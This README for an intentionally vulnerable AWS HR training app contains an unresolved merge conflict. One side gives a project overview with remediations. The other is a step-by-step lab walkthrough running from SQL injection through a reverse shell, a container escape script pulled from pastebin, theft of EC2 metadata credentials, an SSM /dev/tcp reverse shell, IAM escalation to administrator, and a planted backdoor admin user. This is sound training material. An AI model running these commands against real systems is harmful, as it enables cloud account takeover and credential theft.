
<<<<<<< HEAD
## About the Project
HRGoat is an intentionally vulnerable HR management portal designed to demonstrate cloud security vulnerabilities in a controlled environment. It's a comprehensive training tool created for:
- Security professionals practicing cloud-based exploitation
- DevOps engineers learning secure deployment practices
- Development teams studying secure coding
- Organizations conducting security awareness training

## ⚠️ Security Advisory
**WARNING**: This application contains deliberate security vulnerabilities. Deploy only in isolated, controlled environments. Never use in production or connect to sensitive systems.

## Project Structure
```
/
├── src/               # Frontend application code (React)
├── server/            # Backend server code (Node.js/Express)
├── terraform/         # Infrastructure as Code for AWS deployment
└── .github/workflows/ # CI/CD pipelines for automated deployment
```

## Features
- Employee management (create, update, delete, bulk upload)
- Document handling and storage
- User authentication and authorization
- Profile management
- Calendar events
- Payroll & benefits
- Performance tracking
- Notifications

## Deployment with GitHub Actions

### Prerequisites
- GitHub account
- AWS account with appropriate permissions
- Required GitHub secrets:
  - `AWS_ACCESS_KEY_ID`
  - `AWS_SECRET_ACCESS_KEY`

### Deployment Steps
1. Fork this repository to your GitHub account
2. Configure AWS credentials in GitHub Secrets:
   - Navigate to "Settings" → "Secrets"
   - Add required AWS credentials
3. Deploy infrastructure:
   - Go to "Actions" tab
   - Select "Create Infrastructure and Deploy Application"
   - Click "Run workflow"
4. Access application using provided URLs in workflow output:
   - Application Load Balancer URL
   - EC2 instance IP addresses
   - Jenkins server URL

## Vulnerability Overview & Exploitation Guide

### 1. SQL Injection
**Location**: Employee search functionality
**Impact**: Data exposure, potential database compromise

### 2. Insecure Deserialization
**Location**: Employee bulk upload feature
**Impact**: Remote code execution on application container

### 3. Container Escape
**Location**: Docker container configuration
**Impact**: Host system access from container

### 4. Jenkins Exploitation
**Location**: Jenkins instance (port 8080)
**Impact**: CI/CD pipeline compromise

### 5. Privilege Escalation
**Location**: EC2 & Jenkins instances
**Impact**: Full system compromise

### 6. AWS IAM Privilege Escalation
**Location**: EC2 instance roles
**Impact**: AWS account compromise

> For detailed exploitation steps and payloads, see [EXPLOITATION.md](EXPLOITATION.md)

## Security Remediation
1. SQL Injection: Implement parameterized queries
2. Deserialization: Avoid user-controlled data deserialization
3. Container Security: Remove privileged flag
4. Network Segmentation: Implement proper VPC security
5. Jenkins Security: Enforce strong authentication
6. IAM Security: Apply least privilege principle

## License
This project is licensed under the MIT License - see the LICENSE file for details.

## Disclaimer
This software is provided for educational purposes only. Unauthorized security testing is illegal. The author is not responsible for any misuse of this software.
=======
# 🎭 The Great Escape: From SQLi to Full AWS Takeover

## ⚠️ Disclaimer
> This project is for educational and authorized security research purposes only. Unauthorized use of these techniques is illegal and unethical.

## 🏴‍☠️ The Adventure Begins
Once upon a time, in a land of misconfigured cloud environments, a daring security researcher set out on a quest to explore the depths of vulnerabilities. What started as a simple SQL injection led to an ultimate privilege escalation inside AWS. Let's follow the trail!

---

## 🎬 Step 1: The Gate is Wide Open (SQL Injection)
![image](https://github.com/user-attachments/assets/3519076c-3c8c-4cea-96d9-bbb33c331fe6)

Our journey starts at a login screen. With a bit of old-school magic, we bypass authentication using:
```sql
' or '1'='1
```

Boom! We're in. But this is just the beginning...

---

## 🎭 Step 2: Exploiting Insecure Deserialization

To take it a step further, we leverage an insecure deserialization vulnerability. First, ensure you have a machine ready to receive a reverse shell:
```bash
nc -lvnp 4444
```
![image](https://github.com/user-attachments/assets/d346b289-b820-41ac-9d6e-d36fa1938085)

Navigate to System Tools and then Bulk Employee Upload

![image](https://github.com/user-attachments/assets/68dfbb66-245f-45dc-9e70-71ad58afc431)

Modify `rce_exploit.json` found in the `examples` folder, setting your remote IP and port. Then, execute the exploit payload.

---

## 🚀 Step 3: Inside the Container!

We’ve successfully landed in the container. 
![image](https://github.com/user-attachments/assets/52b12748-7744-4f91-b115-8d306e12d386)


But now, let’s check if we can escape:
```bash
grep CapEff /proc/self/status
```
![image](https://github.com/user-attachments/assets/a6e91fd6-c4af-4eb0-98fb-218b3a618120)

If we see certain privilege bits set, it's time to break free! 🔓

---

## 🛠️ Step 4: Breaking Out of the Container

Let's grab and execute the escape script, make sure to create new listener and change the IP and port number that within the script. 
First navigate to the `examples` directory and find the script `container_escape_shell.sh`. Then, upload the script to PasteBin.com 
Not Before you're changing the ATTACKER_IP and the REMOTE_IP parameters that within the script. 

To use this script you need to create a new listener (you can create it on the same machine like before, just with different port,
for example: `nc -nlvp 4445` The port before was 4444
```bash
cd /tmp
wget -O escape.sh -T https://pastebin.com/raw/[your uploaded URL]
sed -i 's/\r$//' escape.sh
chmod +x escape.sh
./escape.sh
```
![image](https://github.com/user-attachments/assets/b90a0976-0cdc-4b7a-8d4a-d82fa000f92e)

We are now inside the EC2 instance. 


---

## 🔑 Step 5: Querying the IMDS for AWS Credentials

Let’s try to obtain a metadata token:
```bash
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
```
![image](https://github.com/user-attachments/assets/5aa90b82-5f83-4e76-9e79-4b660fdd027d)

Success! Now let’s fetch security credentials:
```bash
ROLE_NAME=$(curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/)
```
![image](https://github.com/user-attachments/assets/0068eb1c-f521-4012-9337-b19dd1034a01)

Looks like we have `hrgoat-ssm-role`. Let's extract its credentials:
```bash
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME
```
![image](https://github.com/user-attachments/assets/0f257ddf-90a1-43d0-aa2e-85605d2c57bf)

And there it is—Access Key ID, Secret Access Key, and Session Token! 🔥

---

## 🏠 Step 6: Using EC2 Credentials Locally

Now, let’s shift operations to our local machine:
```bash
export AWS_ACCESS_KEY_ID=<VALUE>
export AWS_SECRET_ACCESS_KEY=<VALUE>
export AWS_SESSION_TOKEN=<VALUE>
```
Verify with:
```bash
aws sts get-caller-identity
```
![image](https://github.com/user-attachments/assets/37bd2d45-44a5-414f-98ce-0d501f4d1fc7)

We have AWS credentials. Time to enumerate our permissions!

---

## 🔍 Step 7: Mapping Out AWS Permissions

Run `check_aws_permissions.sh` from the `examples` folder to identify what actions we can perform.
![image](https://github.com/user-attachments/assets/261c268c-e198-49eb-9d7d-935a7dc2b2fe)


We find permissions allowing us to list EC2 instances and send SSM commands. Perfect for lateral movement!

---

## 📡 Step 8: Moving Laterally with SSM

Let’s list EC2 instances:
```bash
aws ec2 describe-instances --query 'Reservations[*].Instances[*].[InstanceId, Tags[?Key==`Name`].Value|[0], State.Name]' --output table
```
![image](https://github.com/user-attachments/assets/f90a2073-464d-4aba-a12e-bc7c90257fdf)

Found one that looks interesting. Let’s gain access (create new listener, with another port):
```bash
aws ssm send-command --document-name "AWS-RunShellScript" --targets "Key=instanceIds,Values=i-0d76444a40c11c1bf" --parameters "commands=['bash -i >& /dev/tcp/REMOTE_IP/REMOTE_PORT 0>&1']" --region us-east-1
```
![image](https://github.com/user-attachments/assets/162a99c3-0810-4a43-9baf-a2342491c6f5)

Now we have a shell on a second machine. Time to escalate further!

---

## 🏆 Step 9: Privilege Escalation

From the new EC2 instance, repeat the credential extraction process:
```bash
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
echo $TOKEN
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME
```
![image](https://github.com/user-attachments/assets/b0f2e89b-5297-4530-802b-ad7765f8f247)

Fetch roles and credentials, and analyze the permissions.
![image](https://github.com/user-attachments/assets/6f228930-93e1-4cd3-926b-d3903ab99ad7)

---

## 🎯 Step 10: Escalating to Administrator

We find that `hrgoat-jenkins-role` has IAM modification permissions. 
![image](https://github.com/user-attachments/assets/4feefa82-0f32-4d2f-8863-8161da3eeb06)


Let’s exploit it:
```bash
aws iam attach-role-policy --role-name hrgoat-jenkins-role --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```
![image](https://github.com/user-attachments/assets/a7a8846e-78ee-4e7f-84c8-f791b4aa5797)

Check if it worked:
```bash
aws iam list-users
```
![image](https://github.com/user-attachments/assets/dbb2a40f-ea9c-4cd3-86ab-ba110ecc8b8b)

We have admin rights! 🏆

---

## 🚪 Step 11: Planting a Persistent Admin User

Let’s create a backdoor admin:
```bash
aws iam create-user --user-name backdoor-admin
aws iam create-access-key --user-name backdoor-admin
aws iam attach-user-policy --user-name backdoor-admin --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws iam list-attached-user-policies --user-name backdoor-admin
```
### Create New User
![image](https://github.com/user-attachments/assets/18bb0ec6-09a2-4c62-9bf2-3e5d48e5da1e)

### Create User Access Key
![image](https://github.com/user-attachments/assets/28029293-8b4e-4afe-b60d-cdc5b7c3b677)

### Assign permissions and verify it worked
 ![image](https://github.com/user-attachments/assets/c53dc66b-333e-40e3-9af5-004cc4eab627)


Success! Now, full control of the AWS environment is ours.

---

## 🎉 Conclusion

From a simple SQLi to full AWS environment control, we navigated through multiple security misconfigurations and privilege escalations. This journey highlights the importance of:
- Proper input validation to prevent SQLi
- Secure deserialization practices
- Restricting container privileges
- Securing AWS metadata service access
- Applying least privilege principles in AWS IAM

---

💡 **For Defensive Countermeasures & Hardening Tips, see** `SECURITY.md` 🚧
>>>>>>> 0a0b584fe7b915f61e7a873a1b59c7a055d72ab9
